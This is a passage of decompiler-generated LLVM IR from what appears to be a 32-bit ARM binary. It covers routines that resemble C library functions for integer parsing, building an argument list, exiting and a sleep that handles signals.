  %v1_102f0 = load i32, i32* @r5, align 4
  %v2_102f0 = add i32 %v1_102f0, 20
  %v3_102f0 = inttoptr i32 %v2_102f0 to i32*
  store i32 %v0_102f0, i32* %v3_102f0, align 4
  %v0_102f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_102f4 = load i32, i32* @r5, align 4
  %v2_102f4 = add i32 %v1_102f4, 16
  %v3_102f4 = inttoptr i32 %v2_102f4 to i32*
  store i32 %v0_102f4, i32* %v3_102f4, align 4
  %v0_102f8 = load i32, i32* @r4, align 4
  %v1_102f8 = load i32, i32* @r5, align 4
  %v2_102f8 = add i32 %v1_102f8, 12
  %v3_102f8 = inttoptr i32 %v2_102f8 to i32*
  store i32 %v0_102f8, i32* %v3_102f8, align 4
  %v0_102fc = load i32, i32* @r6, align 4
  %v1_102fc = load i32, i32* @r5, align 4
  %v2_102fc = add i32 %v1_102fc, 8
  %v3_102fc = inttoptr i32 %v2_102fc to i32*
  store i32 %v0_102fc, i32* %v3_102fc, align 4
  %v0_10300 = load i32, i32* @r5, align 4
  store i32 %v0_10300, i32* %r1.global-to-local, align 4
  %v0_10304 = load i32, i32* @r0, align 4
  %v2_10304 = inttoptr i32 %v0_10304 to i32*
  %v3_10304 = call i32 @function_101c0(i32* %v2_10304, i32 %v0_10300)
  store i32 %v3_10304, i32* %r0.global-to-local, align 4
  %v0_10308 = load i32, i32* @r4, align 4
  %v2_10308 = icmp eq i32 %v0_10308, 0
  br i1 %v2_10308, label %bb29, label %.thread6

bb29:                                             ; preds = %bb28
  %v1_1032414 = load i32, i32* @r7, align 4
  %v2_1032415 = inttoptr i32 %v1_1032414 to i32*
  store i32 0, i32* %v2_1032415, align 4
  %v1_10328 = load i32, i32* @r4, align 4
  store i32 %v1_10328, i32* %r0.global-to-local, align 4
  br label %bb30

.thread6:                                         ; preds = %bb28
  %v1_1030c = load i32, i32* @r5, align 4
  %v2_1030c = add i32 %v1_1030c, 4
  %v3_1030c = inttoptr i32 %v2_1030c to i32*
  %v4_1030c = load i32, i32* %v3_1030c, align 4
  %v1_10310 = load i32, i32* @r6, align 4
  %v3_10310 = sub i32 %v4_1030c, %v1_10310
  %v4_10314 = sdiv i32 %v3_10310, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1031c = mul i32 %v4_10314, 5
  %v5_1031c = add i32 %v4_1031c, %v0_10308
  store i32 %v5_1031c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10324 = load i32, i32* @r7, align 4
  %v2_10324 = inttoptr i32 %v1_10324 to i32*
  store i32 0, i32* %v2_10324, align 4
  %v1_1032c = load i32, i32* %r3.global-to-local, align 4
  %v2_1032c = load i32, i32* @r7, align 4
  %v3_1032c = inttoptr i32 %v2_1032c to i32*
  store i32 %v1_1032c, i32* %v3_1032c, align 4
  %v17_10330.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %bb29, %.thread6
  %v17_10330 = phi i32 [ %v1_10328, %bb29 ], [ %v17_10330.pre, %.thread6 ]
  %v2_10330 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10330, i32* %r4.global-to-local, align 4
  ret i32 %v17_10330

dec_label_pc_10334:                               ; preds = %dec_label_pc_102b8
  %v0_10334 = call i32 @function_cc08()
  store i32 %v0_10334, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_1033c = inttoptr i32 %v0_10334 to i32*
  store i32 22, i32* %v2_1033c, align 4
  %v0_10340 = call i32 @function_cc08()
  %v0_10344 = load i32, i32* %r4.global-to-local, align 4
  %v2_10344 = inttoptr i32 %v0_10340 to i32*
  store i32 %v0_10344, i32* %v2_10344, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1034c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1034c, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_102c8, { 1, 0 }
  uselistorder i1 %v7_102a0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 %arg3, { 5, 6, 0, 1, 4, 3, 2, 7 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 4, 3, 0, 1, 2 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread1, { 2, 1, 0 }
}

define i32 @function_10354(i8* %arg1) local_unnamed_addr {
dec_label_pc_10354:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_10368 = load i32, i32* @r4, align 4
  store i32 %v3_10368, i32* %stack_var_-36, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v2_1038c.pre = load i32, i32* @global_var_18428, align 4
  br label %dec_label_pc_10384

dec_label_pc_10384:                               ; preds = %dec_label_pc_10384, %dec_label_pc_10354
  %v0_103bc = phi i32 [ %tmp, %dec_label_pc_10354 ], [ %v1_10380, %dec_label_pc_10384 ]
  store i32 %v0_103bc, i32* %r4.global-to-local, align 4
  %v1_10388 = inttoptr i32 %v0_103bc to i8*
  %v2_10388 = load i8, i8* %v1_10388, align 1
  %v3_10388 = zext i8 %v2_10388 to i32
  %v3_10390 = mul nuw nsw i32 %v3_10388, 2
  %v4_10390 = add i32 %v3_10390, %v2_1038c.pre
  %v5_10390 = inttoptr i32 %v4_10390 to i8*
  %v6_10390 = load i8, i8* %v5_10390, align 1
  %v1_10394 = and i8 %v6_10390, 32
  %v2_10394 = icmp eq i8 %v1_10394, 0
  %v1_10380 = add i32 %v0_103bc, 1
  br i1 %v2_10394, label %dec_label_pc_1039c, label %dec_label_pc_10384

dec_label_pc_1039c:                               ; preds = %dec_label_pc_10384
  %v7_1039c = icmp eq i8 %v2_10388, 43
  br i1 %v7_1039c, label %dec_label_pc_103bc, label %dec_label_pc_103a4

dec_label_pc_103a4:                               ; preds = %dec_label_pc_1039c
  %v7_103a4 = icmp eq i8 %v2_10388, 45
  br i1 %v7_103a4, label %dec_label_pc_103bc, label %bb

bb:                                               ; preds = %dec_label_pc_103a4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10418

dec_label_pc_103bc:                               ; preds = %dec_label_pc_1039c, %dec_label_pc_103a4
  %storemerge30 = phi i32 [ 1, %dec_label_pc_103a4 ], [ 0, %dec_label_pc_1039c ]
  store i32 %storemerge30, i32* %r7.global-to-local, align 4
  store i32 %v1_10380, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10418

dec_label_pc_10418:                               ; preds = %bb, %dec_label_pc_103bc
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v2_10420 = call i32 @function_c864(i32 -1, i32 10)
  %v0_10424 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10424, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v1_10430 = urem i32 %v2_10420, 256
  store i32 %v1_10430, i32* %sl.global-to-local, align 4
  %v0_10434 = call i32 @function_14a34()
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_10434, i32* %r8.global-to-local, align 4
  %v0_10448.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10448

dec_label_pc_10444:                               ; preds = %bb48, %dec_label_pc_104a4
  %v0_10444 = phi i32 [ %v1_10474, %bb48 ], [ %v0_10444.pre, %dec_label_pc_104a4 ]
  store i32 %v0_10444, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10448

dec_label_pc_10448:                               ; preds = %dec_label_pc_10418, %dec_label_pc_10444
  %v0_10474 = phi i32 [ %v0_10448.pre, %dec_label_pc_10418 ], [ %v0_10444, %dec_label_pc_10444 ]
  %v1_10448 = inttoptr i32 %v0_10474 to i8*
  %v2_10448 = load i8, i8* %v1_10448, align 1
  %v3_10448 = zext i8 %v2_10448 to i32
  %v1_1044c = add nsw i32 %v3_10448, -48
  %v1_10450 = urem i32 %v1_1044c, 256
  %v1_10458 = or i32 %v3_10448, 32
  %tmp56 = icmp ult i32 %v1_10450, 10
  br i1 %tmp56, label %bb43, label %dec_label_pc_10460

dec_label_pc_10460:                               ; preds = %dec_label_pc_10448
  %tmp57 = icmp ugt i32 %v1_10458, 96
  br i1 %tmp57, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_10460
  %v1_10464 = add nsw i32 %v1_10458, -87
  %v5_1046c = urem i32 %v1_10464, 256
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_10448, %dec_label_pc_10460, %bb42
  %v3_1049c = phi i32 [ %v1_10450, %dec_label_pc_10448 ], [ 40, %dec_label_pc_10460 ], [ %v5_1046c, %bb42 ]
  %v1_10470 = load i32, i32* %r5.global-to-local, align 4
  %v1_10474 = add i32 %v0_10474, 1
  store i32 %v1_10474, i32* %r4.global-to-local, align 4
  %v6_10478 = icmp slt i32 %v3_1049c, %v1_10470
  br i1 %v6_10478, label %dec_label_pc_1047c, label %dec_label_pc_104bc

dec_label_pc_1047c:                               ; preds = %bb43
  %v0_1047c = load i32, i32* %ip.global-to-local, align 4
  %v1_1047c = load i32, i32* %r8.global-to-local, align 4
  %v9_1047c = icmp eq i32 %v0_1047c, %v1_1047c
  br i1 %v9_1047c, label %.thread, label %bb44

.thread:                                          ; preds = %dec_label_pc_1047c
  br label %dec_label_pc_1048c

bb44:                                             ; preds = %dec_label_pc_1047c
  %v3_1047c = icmp ult i32 %v0_1047c, %v1_1047c
  br i1 %v3_1047c, label %dec_label_pc_1048c, label %dec_label_pc_104a4

dec_label_pc_1048c:                               ; preds = %bb44, %.thread
  %v4_104941727 = phi i32 [ 1, %.thread ], [ 0, %bb44 ]
  %v1_1048c = load i32, i32* %sl.global-to-local, align 4
  %v3_1048c = icmp uge i32 %v3_1049c, %v1_1048c
  %v9_1048c = icmp eq i32 %v3_1049c, %v1_1048c
  %v2_10490 = xor i1 %v3_1048c, true
  %v3_10490 = or i1 %v9_1048c, %v2_10490
  br i1 %v3_10490, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_1048c
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1048c, %bb45
  %v4_10494 = phi i32 [ %v4_104941727, %dec_label_pc_1048c ], [ 0, %bb45 ]
  %v2_10494 = xor i1 %v9_1048c, true
  %v3_10494 = and i1 %v3_1048c, %v2_10494
  br i1 %v3_10494, label %bb47, label %thread-pre-split

bb47:                                             ; preds = %bb46
  %v5_10494 = urem i32 %v4_10494, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb46, %bb47
  %v0_10498 = phi i32 [ %v5_10494, %bb47 ], [ %v4_10494, %bb46 ]
  %v2_10498 = icmp eq i32 %v0_10498, 0
  br i1 %v2_10498, label %bb48, label %dec_label_pc_104a4

bb48:                                             ; preds = %thread-pre-split
  %v4_1049c = mul i32 %v0_1047c, %v1_10470
  %v5_1049c = add i32 %v4_1049c, %v3_1049c
  store i32 %v5_1049c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10444

dec_label_pc_104a4:                               ; preds = %bb44, %thread-pre-split
  %v0_104a4 = call i32 @function_cc08()
  %v0_104a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_104a8 = load i32, i32* %fp.global-to-local, align 4
  %v2_104a8 = and i32 %v1_104a8, %v0_104a8
  store i32 %v2_104a8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_104b4 = inttoptr i32 %v0_104a4 to i32*
  store i32 34, i32* %v2_104b4, align 4
  %v0_10444.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10444

dec_label_pc_104bc:                               ; preds = %bb43
  %v0_104bc.pre = load i32, i32* %sb.global-to-local, align 4
  %v2_104bc = icmp eq i32 %v0_104bc.pre, 0
  br i1 %v2_104bc, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_104bc
  %v1_104c0 = load i32, i32* %r6.global-to-local, align 4
  %v3_104c0 = inttoptr i32 %v0_104bc.pre to i32*
  store i32 %v1_104c0, i32* %v3_104c0, align 4
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_104bc, %bb49
  %v0_104c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_104c4 = icmp eq i32 %v0_104c4, 0
  %. = select i1 %v2_104c4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_104d0 = load i32, i32* %fp.global-to-local, align 4
  %v2_104d0 = icmp eq i32 %v0_104d0, 0
  %v0_104f4.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_104d0, label %dec_label_pc_104ec, label %bb53

bb53:                                             ; preds = %bb50
  %tmp58 = icmp ugt i32 %v0_104f4.pre.pre, %.
  br i1 %tmp58, label %dec_label_pc_104dc, label %dec_label_pc_104ec

dec_label_pc_104dc:                               ; preds = %bb53
  %v0_104dc = call i32 @function_cc08()
  %v2_104e4 = inttoptr i32 %v0_104dc to i32*
  store i32 34, i32* %v2_104e4, align 4
  %v0_104e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_104e8, i32* %ip.global-to-local, align 4
  %v0_104ec.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_104ec

dec_label_pc_104ec:                               ; preds = %bb53, %bb50, %dec_label_pc_104dc
  %v0_104f4.pre = phi i32 [ %v0_104f4.pre.pre, %bb53 ], [ %v0_104e8, %dec_label_pc_104dc ], [ %v0_104f4.pre.pre, %bb50 ]
  %v0_104ec = phi i32 [ %v0_104c4, %bb53 ], [ %v0_104ec.pre, %dec_label_pc_104dc ], [ %v0_104c4, %bb50 ]
  %v2_104ec = icmp eq i32 %v0_104ec, 0
  br i1 %v2_104ec, label %dec_label_pc_104ec._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_104ec
  %v2_104f0 = sub i32 0, %v0_104f4.pre
  store i32 %v2_104f0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_104ec._crit_edge

dec_label_pc_104ec._crit_edge:                    ; preds = %dec_label_pc_104ec, %bb54
  %v0_104f4 = phi i32 [ %v2_104f0, %bb54 ], [ %v0_104f4.pre, %dec_label_pc_104ec ]
  %v2_104f8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_104f8, i32* @r4, align 4
  ret i32 %v0_104f4

; uselistorder directives
  uselistorder i32 %v0_104f4.pre, { 1, 0 }
  uselistorder i32 %v0_104f4.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v0_104bc.pre, { 1, 0 }
  uselistorder i32 %v4_10494, { 1, 0 }
  uselistorder i1 %v3_1048c, { 1, 0 }
  uselistorder i32 %v1_1048c, { 1, 0 }
  uselistorder i32 %v1_10474, { 1, 0 }
  uselistorder i32 %v1_10458, { 1, 0 }
  uselistorder i32 %v1_10450, { 1, 0 }
  uselistorder i32 %v0_10444, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 -87, { 1, 0 }
  uselistorder label %dec_label_pc_104ec._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_104ec, { 2, 0, 1 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_104a4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb43, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10448, { 1, 0 }
  uselistorder label %dec_label_pc_10444, { 1, 0 }
  uselistorder label %dec_label_pc_10418, { 1, 0 }
  uselistorder label %dec_label_pc_103bc, { 1, 0 }
}

define i32 @function_10500(i32 %arg1) local_unnamed_addr {
dec_label_pc_10500:
  %stack_var_-16 = alloca i32, align 4
  %v2_10500 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_10500, i32* @r0, align 4
  %v1_1051c = call i32 @function_10840()
  %v1_1052c = call i32 @function_10838()
  %v2_10534 = load i32, i32* @global_var_1aaac.477, align 4
  %v2_10538 = icmp eq i32 %v2_10534, 0
  br i1 %v2_10538, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_10500
  call void @__pseudo_branch(i32 %v2_10534)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10500, %bb
  store i32 %v2_10500, i32* @r0, align 4
  %v1_10558 = call i32 @function_10840()
  store i32 %v1_10558, i32* @r0, align 4
  %v1_1055c = call i32 @function_107cc(i32 %v1_10558)
  store i32 66928, i32* @lr, align 4
  %v2_1056c = call i32 @function_d554()
  %v0_10570 = load i32, i32* @r4, align 4
  %v1_10574 = call i32 @function_10d38(i32 %v0_10570)
  unreachable

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_10594(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10594:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_10594 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_10594, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_105a4 = ptrtoint i32* %stack_var_-32 to i32
  %v2_105a8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_105a8, i32* %stack_var_-32, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_105b4

dec_label_pc_105b4:                               ; preds = %dec_label_pc_105b4, %dec_label_pc_10594
  %v0_105c8 = phi i32 [ %v1_105c8, %dec_label_pc_105b4 ], [ 0, %dec_label_pc_10594 ]
  %v3_105b4 = phi i32 [ %v1_105bc, %dec_label_pc_105b4 ], [ %v2_105a8, %dec_label_pc_10594 ]
  %v1_105b8 = inttoptr i32 %v3_105b4 to i32*
  %v2_105b8 = load i32, i32* %v1_105b8, align 4
  %v1_105bc = add i32 %v3_105b4, 4
  %v2_105c0 = icmp eq i32 %v2_105b8, 0
  store i32 %v1_105bc, i32* %stack_var_-32, align 4
  %v1_105c8 = add i32 %v0_105c8, 1
  store i32 %v1_105c8, i32* %lr.global-to-local, align 4
  br i1 %v2_105c0, label %dec_label_pc_105d0, label %dec_label_pc_105b4

dec_label_pc_105d0:                               ; preds = %dec_label_pc_105b4
  %v3_105d0.neg = mul i32 %v1_105c8, -4
  %v1_105d4.neg = add i32 %v2_105a4, -8
  %v2_105d8 = add i32 %v1_105d4.neg, %v3_105d0.neg
  %v2_105e0 = inttoptr i32 %v2_105d8 to i32*
  store i32 %arg1, i32* %v2_105e0, align 4
  store i32 %v2_105a8, i32* %stack_var_-32, align 4
  %v0_105ec = load i32, i32* @sp, align 4
  store i32 %v0_105ec, i32* @r1, align 4
  store i32 %v0_105ec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_105f4

dec_label_pc_105f4:                               ; preds = %dec_label_pc_105f4.dec_label_pc_105f4_crit_edge, %dec_label_pc_105d0
  %v1_10608 = phi i32 [ %v5_10608, %dec_label_pc_105f4.dec_label_pc_105f4_crit_edge ], [ %v0_105ec, %dec_label_pc_105d0 ]
  %v3_105f4 = phi i32 [ %v3_105f4.pre, %dec_label_pc_105f4.dec_label_pc_105f4_crit_edge ], [ %v2_105a8, %dec_label_pc_105d0 ]
  %v1_105f8 = inttoptr i32 %v3_105f4 to i32*
  %v2_105f8 = load i32, i32* %v1_105f8, align 4
  %v0_105fc = load i32, i32* %lr.global-to-local, align 4
  %v1_105fc = add i32 %v0_105fc, -1
  store i32 %v1_105fc, i32* %lr.global-to-local, align 4
  %v7_105fc = icmp eq i32 %v0_105fc, 1
  %v1_10600 = add i32 %v3_105f4, 4
  store i32 %v1_10600, i32* %stack_var_-32, align 4
  %v2_10608 = add i32 %v1_10608, 4
  %v3_10608 = inttoptr i32 %v2_10608 to i32*
  store i32 %v2_105f8, i32* %v3_10608, align 4
  %v4_10608 = load i32, i32* %ip.global-to-local, align 4
  %v5_10608 = add i32 %v4_10608, 4
  store i32 %v5_10608, i32* %ip.global-to-local, align 4
  br i1 %v7_105fc, label %dec_label_pc_10610, label %dec_label_pc_105f4.dec_label_pc_105f4_crit_edge

dec_label_pc_105f4.dec_label_pc_105f4_crit_edge:  ; preds = %dec_label_pc_105f4
  %v3_105f4.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_105f4

dec_label_pc_10610:                               ; preds = %dec_label_pc_105f4
  %v2_10614 = load i32, i32* @global_var_1aab4.482, align 4
  store i32 %v2_10614, i32* @r2, align 4
  %v0_10618 = call i32 @function_10d8c()
  ret i32 %v0_10618

; uselistorder directives
  uselistorder i32 %v5_10608, { 1, 0 }
  uselistorder i32 %v0_105fc, { 1, 0 }
  uselistorder i32 %v1_105c8, { 0, 2, 1 }
  uselistorder i32 %v1_105bc, { 1, 0 }
  uselistorder i32 %v3_105b4, { 1, 0 }
  uselistorder i32 %v2_105a8, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_10628(i32 %arg1) local_unnamed_addr {
dec_label_pc_10628:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10628 = load i32, i32* @r4, align 4
  store i32 %v3_10628, i32* %stack_var_-20, align 4
  %v6_10628 = load i32, i32* @r5, align 4
  %v9_10628 = load i32, i32* @r6, align 4
  %v16_10628 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_1062c = icmp eq i32 %arg1, 0
  %v2_10630 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_1062c, label %dec_label_pc_107b4, label %dec_label_pc_10648.preheader

dec_label_pc_10648.preheader:                     ; preds = %dec_label_pc_10628
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_1065017 = add i32 %v16_10628, 124
  br label %dec_label_pc_10640

dec_label_pc_10640:                               ; preds = %dec_label_pc_10648.preheader, %dec_label_pc_10640
  %v5_1065018 = phi i32 [ %v5_1065017, %dec_label_pc_10648.preheader ], [ %v5_10650, %dec_label_pc_10640 ]
  %v2_10644 = add i32 %v5_1065018, -136
  %v3_10644 = inttoptr i32 %v2_10644 to i32*
  store i32 0, i32* %v3_10644, align 4
  %v0_10648.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10648 = add i32 %v0_10648.pre, -1
  store i32 %v1_10648, i32* %r1.global-to-local, align 4
  %v6_10648 = icmp slt i32 %v1_10648, 0
  %v4_10650 = mul i32 %v1_10648, 4
  %v5_10650 = add i32 %v4_10650, %v16_10628
  br i1 %v6_10648, label %dec_label_pc_10658, label %dec_label_pc_10640

dec_label_pc_10658:                               ; preds = %dec_label_pc_10640
  %v2_10658 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_10658, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v0_10668 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_10668, i32* %stack_var_-28, align 4
  %v2_10670 = call i32 @function_13360(i32 %v2_10658, i32 17)
  store i32 %v2_10670, i32* %r0.global-to-local, align 4
  %v1_10674 = load i32, i32* @r5, align 4
  %v5_10678 = icmp slt i32 %v2_10670, %v1_10674
  br i1 %v5_10678, label %dec_label_pc_107bc, label %dec_label_pc_1067c

dec_label_pc_1067c:                               ; preds = %dec_label_pc_10658
  %v2_1067c = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_1067c, i32* @r4, align 4
  store i32 %v1_10674, i32* %r0.global-to-local, align 4
  store i32 %v2_10658, i32* %r1.global-to-local, align 4
  %v3_1068c = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_1068c = call i32 @function_10f84(i32 %v1_10674, %_TYPEDEF_sigset_t* %v3_1068c, i32 %v2_1067c)
  store i32 %v4_1068c, i32* %r0.global-to-local, align 4
  %v1_10690 = load i32, i32* @r5, align 4
  %v9_10690 = icmp eq i32 %v4_1068c, %v1_10690
  br i1 %v9_10690, label %dec_label_pc_10698, label %dec_label_pc_107bc

dec_label_pc_10698:                               ; preds = %dec_label_pc_1067c
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_1067c, i32* %r0.global-to-local, align 4
  %v2_106a0 = call i32 @function_1333c(i32 %v2_1067c, i32 17)
  store i32 %v2_106a0, i32* %r0.global-to-local, align 4
  %v1_106a4 = load i32, i32* @r5, align 4
  %v9_106a4 = icmp eq i32 %v2_106a0, %v1_106a4
  br i1 %v9_106a4, label %dec_label_pc_106bc.preheader, label %dec_label_pc_10698.dec_label_pc_10784_crit_edge

dec_label_pc_10698.dec_label_pc_10784_crit_edge:  ; preds = %dec_label_pc_10698
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_10784

dec_label_pc_106bc.preheader:                     ; preds = %dec_label_pc_10698
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_106b4

dec_label_pc_106b4:                               ; preds = %dec_label_pc_106bc.preheader, %dec_label_pc_106b4
  %v5_106c416 = phi i32 [ %v5_1065017, %dec_label_pc_106bc.preheader ], [ %v5_106c4, %dec_label_pc_106b4 ]
  %v2_106b8 = add i32 %v5_106c416, -136
  %v3_106b8 = inttoptr i32 %v2_106b8 to i32*
  store i32 0, i32* %v3_106b8, align 4
  %v0_106bc.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_106bc = add i32 %v0_106bc.pre, -1
  store i32 %v1_106bc, i32* %r1.global-to-local, align 4
  %v6_106bc = icmp slt i32 %v1_106bc, 0
  %v4_106c4 = mul i32 %v1_106bc, 4
  %v5_106c4 = add i32 %v4_106c4, %v16_10628
  br i1 %v6_106bc, label %dec_label_pc_106cc, label %dec_label_pc_106b4

dec_label_pc_106cc:                               ; preds = %dec_label_pc_106b4
  store i32 %v2_10658, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v2_106d4 = call i32 @function_13360(i32 %v2_10658, i32 17)
  store i32 %v2_106d4, i32* %r0.global-to-local, align 4
  %v1_106d8 = icmp slt i32 %v2_106d4, 0
  br i1 %v1_106d8, label %dec_label_pc_107bc, label %dec_label_pc_106e0

dec_label_pc_106e0:                               ; preds = %dec_label_pc_106cc
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_106ec = call i32 @function_10b24(i32 17, i32* null, i32 %v2_10630)
  store i32 %v4_106ec, i32* %r0.global-to-local, align 4
  %v1_106f0 = icmp slt i32 %v4_106ec, 0
  br i1 %v1_106f0, label %dec_label_pc_106f8, label %dec_label_pc_10720

dec_label_pc_106f8:                               ; preds = %dec_label_pc_106e0
  %v0_106f8 = call i32 @function_cc08()
  store i32 %v2_1067c, i32* %r1.global-to-local, align 4
  store i32 %v0_106f8, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_1070c = inttoptr i32 %v0_106f8 to i32*
  %v2_1070c = load i32, i32* %v1_1070c, align 4
  store i32 %v2_1070c, i32* @r4, align 4
  %v3_10710 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_10710 = call i32 @function_10f84(i32 2, %_TYPEDEF_sigset_t* %v3_10710, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10718 = load i32, i32* @r4, align 4
  %v1_10718 = load i32, i32* %r5.global-to-local, align 4
  %v2_10718 = inttoptr i32 %v1_10718 to i32*
  store i32 %v0_10718, i32* %v2_10718, align 4
  %v17_107c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107c0

dec_label_pc_10720:                               ; preds = %dec_label_pc_106e0
  %v2_10720 = load i32, i32* %stack_var_-424, align 4
  %v7_10724 = icmp eq i32 %v2_10720, 1
  %v2_1072c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1072c, i32* @r4, align 4
  br i1 %v7_10724, label %dec_label_pc_10734, label %dec_label_pc_10768

dec_label_pc_10734:                               ; preds = %dec_label_pc_10720
  store i32 %v2_1072c, i32* %r1.global-to-local, align 4
  store i32 %v2_1072c, i32* %r0.global-to-local, align 4
  %v2_1073c = bitcast i32* %stack_var_-28 to %timespec*
